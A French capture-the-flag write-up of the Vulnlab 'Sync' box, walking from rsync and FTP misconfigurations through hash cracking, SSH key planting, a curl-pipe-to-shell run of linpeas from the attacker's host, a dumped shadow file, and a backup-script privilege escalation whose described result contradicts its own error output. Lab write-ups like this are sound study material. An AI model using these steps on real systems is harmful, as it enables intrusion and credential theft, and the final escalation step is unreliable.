@@ -1,0 +1,367 @@
+---
+title: Sync - Easy
+description: WU Sync - Easy
+categories: [Writeup]
+tags: [writeup]
+template: doc
+---
+import { Image } from 'astro:assets';
+import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
+
+<Image src={banner} alt="banner" format="avif" quality={"mid"}/>
+
+
+# SYNC
+
+
+| OS | Difficulty | Target |
+|----|----|----|
+| Linux | <span style="color:green">**EASY**</span> | 10.10.124.199 |
+
+
+
+# 🔭 Enumeration
+
+```sh
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+873/tcp open  rsync
+```
+
+Scan approfondi:
+
+```sh
+PORT    STATE SERVICE VERSION
+21/tcp  open  ftp     vsftpd 3.0.5
+22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f801850047fbbb0266289b175aad091f (ECDSA)
+|_  256 d784c5c04c7191f42f5bfec9fcf66039 (ED25519)
+80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Login
+873/tcp open  rsync   (protocol version 31)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Le port 80 permet d'afficher une page de login avec username/password.
+Le port 21 ne semble pas être configurer pour se connecter en `anonymous`.
+Le port 873, `RSYNC` nous permet d'obtenir quelques informations:
+
+```sh
+rsync -av --list-only rsync://10.10.124.199
+httpd          	web backup
+
+rsync -r 10.10.124.199::httpd 
+drwxr-xr-x          4,096 2023/04/20 21:50:04 .
+drwxr-xr-x          4,096 2023/04/20 22:13:22 db
+-rw-r--r--         12,288 2023/04/20 21:50:42 db/site.db
+drwxr-xr-x          4,096 2023/04/20 21:50:50 migrate
+drwxr-xr-x          4,096 2023/04/20 22:13:15 www
+-rw-r--r--          1,722 2023/04/20 22:02:54 www/dashboard.php
+-rw-r--r--          2,315 2023/04/20 22:09:10 www/index.php
+-rw-r--r--            101 2023/04/20 22:03:08 www/logout.php
+
+# Téléchargeons le contenu
+rsync -r 10.10.124.199::httpd/ .
+```
+Le fichier `www/index.php` contient un hash:
+
+```php
+ session_start();
+ $secure = "6c4972f3717a5e881e282ad3105de01e";
+ 
+ if (isset($_SESSION['username'])) {
+     header('Location: dashboard.php');
+     exit();
+ }
+```
+La `db` nous donne quelques informations complémentaires:
+
+```sqlite
+sqlite3 db/site.db                             
+SQLite version 3.40.1 2022-12-28 14:03:47
+Enter ".help" for usage hints.
+sqlite> .dump
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT NOT NULL,
+    password TEXT NOT NULL
+);
+INSERT INTO users VALUES(1,'admin','7658a2741c9df3a97c819584db6e6b3c');
+INSERT INTO users VALUES(2,'triss','a0de4d7f81676c3ea9eabcadfd2536f6');
+DELETE FROM sqlite_sequence;
+INSERT INTO sqlite_sequence VALUES('users',2);
+COMMIT;
+```
+
+On obtient deux users `triss` et `admin`.
+
+En retournant dans le fichier `index.php` il est clairement affiché que la vérification de la combinaison user/password est comme ceci:
+```php
+$hash = md5("$secure|$username|$password");
+```
+Utilisons `Hashcat` pour tenter de déchiffrer les mots de passes.
+Pour que le hash soit accepté par `hashcat` voici le format de fichier: `<HASH_DB>:<HASH_SECURE>|<user>|`
+
+```sh
+hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
+[...]
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 2 secs
+
+a0de4d7f81676c3ea9eabcadfd2536f6:6c4972f3717a5e881e282ad3105de01e|triss|:gerald
+Approaching final keyspace - workload adjusted.  
+```
+
+Après essai de connexion sur le site les credentials fonctionnent. Mais rien à faire dessus. Essayons en ssh.
+
+```sh
+ssh triss@10.10.124.199
+The authenticity of host '10.10.124.199 (10.10.124.199)' can't be established.
+ED25519 key fingerprint is SHA256:UWkxVBN9lsZJlnsaeyTstJxRWBXgorG1wJErlxwSXlU.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.124.199' (ED25519) to the list of known hosts.
+triss@10.10.124.199: Permission denied (publickey).
+```
+`ssh` vérifie les clés présentes. Passons par le `ftp`.
+
+Via le ftp nous sommes dans un dossier `/home`:
+
+```ftp
+ftp> ls -la
+229 Entering Extended Passive Mode (|||9885|)
+150 Here comes the directory listing.
+drwxr-x---    2 1003     1003         4096 Sep 22 09:20 .
+drwxr-x---    2 1003     1003         4096 Sep 22 09:20 ..
+lrwxrwxrwx    1 0        0               9 Apr 21  2023 .bash_history -> /dev/null
+-rw-r--r--    1 1003     1003          220 Apr 19  2023 .bash_logout
+-rw-r--r--    1 1003     1003         3771 Apr 19  2023 .bashrc
+-rw-r--r--    1 1003     1003          807 Apr 19  2023 .profile
+```
+
+Nous générons une paire de clé ssh et nous importons la clé publique que nous renommons `authorized_keys`
+```sh
+ftp> mkdir .ssh
+257 "/.ssh" created
+
+ftp> rename authorized_keys .ssh/authorized_keys
+350 Ready for RNTO.
+250 Rename successful.
+```
+
+Tentons de nouveau la connexion ssh avec `Triss`.
+
+```sh
+ssh -i id_rsa triss@10.10.124.199
+triss@ip-10-10-200-238:~$ ls
+triss@ip-10-10-200-238:~$ pwd
+/home/triss
+triss@ip-10-10-200-238:~$ sudo -l
+[sudo] password for triss: 
+Sorry, user triss may not run sudo on ip-10-10-200-238.
+triss@ip-10-10-200-238:~$ cd ..
+triss@ip-10-10-200-238:/home$ ls
+httpd  jennifer  sa  triss  ubuntu
+triss@ip-10-10-200-238:/home$ cd jennifer
+-bash: cd: jennifer: Permission denied
+```
+
+
+
+# 👣 Foothold
+
+Connecté en ssh avec `Triss`, nous ne pouvons rien faire. Nous décidons de tenter avec le même mot de passe de nous connecté à `sa`, `ubuntu` et `jennifer`.
+Sans succès pour les deux premiers mais fonctionnel pour `Jennifer`:
+
+```sh
+jennifer@ip-10-10-200-238:/home$ cd jennifer
+jennifer@ip-10-10-200-238:~$ ls
+user.txt
+```
+
+A partir de ce moment, nous décidons de lancer `Linpeas` pour obtenir plus d'informations sur d'éventuelles vulnérabilités exploitables.
+```sh
+[...]
+curl http://10.8.3.147/linpeas.sh | sh
+╔══════════╣ Unexpected in root
+/backup
+[...]
+╔══════════╣ Backup files (limited 100)
+-rw-r--r-- 1 root root 411 Sep 22 08:42 /run/blkid/blkid.tab.old
+-rwxr-xr-x 1 root root 2196 May 25  2022 /usr/libexec/dpkg/dpkg-db-backup
+-rwxr-xr-x 1 sa sa 211 Apr 19  2023 /usr/local/bin/backup.sh
+[...]
+```
+Nous avons donc un dossier `/backup` à la racine et un script `backup.sh`appartenant à `sa`.
+
+# 🔄 Lateral Movement
+
+Le but désormais est d'obtenir le mot de passe de `sa` pour se connecter à cet utilisateur et ensuite de voir ce qu'il y a dans `backup.sh`.
+
+```sh
+jennifer@ip-10-10-200-238:/backup$ ls -l
+total 232
+-rw-r--r-- 1 root root 5899 Sep 22 08:44 1726994641.zip
+-rw-r--r-- 1 root root 5899 Sep 22 08:46 1726994761.zip
+-rw-r--r-- 1 root root 5899 Sep 22 08:48 1726994881.zip
+-rw-r--r-- 1 root root 5899 Sep 22 08:50 1726995001.zip
+-rw-r--r-- 1 root root 5899 Sep 22 08:52 1726995121.zip
+-rw-r--r-- 1 root root 5899 Sep 22 08:54 1726995242.zip
+-rw-r--r-- 1 root root 5899 Sep 22 08:56 1726995361.zip
+-rw-r--r-- 1 root root 5899 Sep 22 08:58 1726995481.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:00 1726995601.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:02 1726995721.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:04 1726995841.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:06 1726995961.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:08 1726996081.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:10 1726996201.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:12 1726996321.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:14 1726996441.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:16 1726996561.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:18 1726996681.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:20 1726996801.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:22 1726996921.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:24 1726997041.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:26 1726997161.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:28 1726997281.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:30 1726997401.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:32 1726997521.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:34 1726997641.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:36 1726997761.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:38 1726997881.zip
+-rw-r--r-- 1 root root 5899 Sep 22 09:40 1726998001.zip
+```
+
+Nous prenons la première archive et regardons ce qu'il s'y trouve.
+
+```sh
+jennifer@ip-10-10-200-238:/backup$ cp 1726994641.zip /tmp
+jennifer@ip-10-10-200-238:/tmp$ unzip 1726994641.zip 
+Archive:  1726994641.zip
+   creating: tmp/backup/
+  inflating: tmp/backup/rsyncd.conf  
+   creating: tmp/backup/httpd/
+   creating: tmp/backup/httpd/www/
+  inflating: tmp/backup/httpd/www/dashboard.php  
+  inflating: tmp/backup/httpd/www/logout.php  
+  inflating: tmp/backup/httpd/www/index.php  
+   creating: tmp/backup/httpd/migrate/
+   creating: tmp/backup/httpd/db/
+  inflating: tmp/backup/httpd/db/site.db  
+  inflating: tmp/backup/passwd       
+  inflating: tmp/backup/shadow       
+```
+Intéressant, le backup possède le fichier `shadow`.
+```sh
+jennifer@ip-10-10-200-238:/tmp/tmp/backup$ cat shadow
+root:$y$j9T$Lvn5CBDJCop7JR9iMerFr1$dfzHPNhyy1jkree7XtvuxhyYziUbVC.W5ltk7CTFJKA:19466:0:99999:7:::
+daemon:*:19441:0:99999:7:::
+bin:*:19441:0:99999:7:::
+sys:*:19441:0:99999:7:::
+sync:*:19441:0:99999:7:::
+games:*:19441:0:99999:7:::
+man:*:19441:0:99999:7:::
+lp:*:19441:0:99999:7:::
+mail:*:19441:0:99999:7:::
+news:*:19441:0:99999:7:::
+uucp:*:19441:0:99999:7:::
+proxy:*:19441:0:99999:7:::
+www-data:*:19441:0:99999:7:::
+backup:*:19441:0:99999:7:::
+list:*:19441:0:99999:7:::
+irc:*:19441:0:99999:7:::
+gnats:*:19441:0:99999:7:::
+nobody:*:19441:0:99999:7:::
+systemd-network:*:19441:0:99999:7:::
+systemd-resolve:*:19441:0:99999:7:::
+messagebus:*:19441:0:99999:7:::
+systemd-timesync:*:19441:0:99999:7:::
+syslog:*:19441:0:99999:7:::
+_apt:*:19441:0:99999:7:::
+tss:*:19441:0:99999:7:::
+uuidd:*:19441:0:99999:7:::
+tcpdump:*:19441:0:99999:7:::
+sshd:*:19441:0:99999:7:::
+pollinate:*:19441:0:99999:7:::
+landscape:*:19441:0:99999:7:::
+fwupd-refresh:*:19441:0:99999:7:::
+ec2-instance-connect:!:19441:0:99999:7:::
+_chrony:*:19441:0:99999:7:::
+ubuntu:!:19466:0:99999:7:::
+lxd:!:19466::::::
+sa:$y$j9T$jJFOBCaiGJUmyZZRFn5aG1$7pSWDUlnIOlXInoK4nn3gCEIiMp94x8sXaV.DtTzM6D:19468:0:99999:7:::
+httpd:$y$j9T$88wPEXTVd61aOFzWkEMEP1$LJwwm3kqnGIDD4pvfFPqgfC/w15F8N2VdLChRDI7GX5:19466:0:99999:7:::
+triss:$y$j9T$cJzLWCatbO1.azxJo6eQN1$I4BAX3vXEOlfg4v/q5tIibnVNR61C6V4QFQEI/Y1pD4:19466:0:99999:7:::
+ftp:*:19466:0:99999:7:::
+jennifer:$y$j9T$DBxmxcNWJlhvgfWCUTbEC0$98T55fRnXftC4XaKZdDJ6IMPsqXP1fA6QVAioJ3CZo7:19466:0:99999:7:::
+```
+
+`$y$` suppose d'un format `yescrypt`, récupérons le hash de `sa` et direction `John The Ripper`:
+
+```sh
+john sa.txt --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (crypt, generic crypt(3) [?/64])
+Cost 1 (algorithm [0:unknown 1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt 7:scrypt 10:yescrypt 11:gost-yescrypt]) is 10 for all loaded hashes
+Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+sakura           (sa)     
+1g 0:00:00:01 DONE (2024-09-22 11:54) 0.9901g/s 190.1p/s 190.1c/s 190.1C/s daniela..november
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Le mot de passe de `sa` est récupéré. Voyons comment gagner en privilèges.
+
+# 🎯 Privilege Escalation
+
+Connecté en `sa`.
+
+```sh
+ennifer@ip-10-10-200-238:/tmp/tmp/backup$ su sa
+Password: 
+sa@ip-10-10-200-238:/tmp/tmp/backup$ sudo -l
+[sudo] password for sa: 
+Sorry, user sa may not run sudo on ip-10-10-200-238.
+sa@ip-10-10-200-238:/tmp/tmp/backup$ vim /usr/bin/backup.sh
+```
+Le script montre une succession de commandes en copiant plusieurs fichiers, puis en archivant ce dernier et supprimant les dossiers `/tmp/backup`:
+
+```sh backup.sh
+#!/bin/bash
+mkdir -p /tmp/backup
+cp -r /opt/httpd /tmp/backup
+cp /etc/passwd /tmp/backup
+cp /etc/shadow /tmp/backup
+cp /etc/rsyncd.conf /tmp/backup
+zip -r /backup/$(date +%s).zip /tmp/backup
+rm -rf /tmp/backup
+```
+
+Nous supprimons la dernière ligne et la remplaçons par ceci:
+
+```sh
+cat /root/root.txt >/tmp/flag.txt
+```
+Puis nous exécutons le script. Malgré l'erreur de la commande `cat` la copy du fichier `root.txt` a bel et bien été effectué.
+```sh
+sa@ip-10-10-200-238:/tmp/backup$ bash /usr/local/bin/backup.sh
+cat: /root/root.txt: Permission denied
+sa@ip-10-10-200-238:/tmp/backup$ ls
+httpd  passwd  root.txt  rsyncd.conf  shadow
+sa@ip-10-10-200-238:/tmp/backup$ cat root.txt 
+```
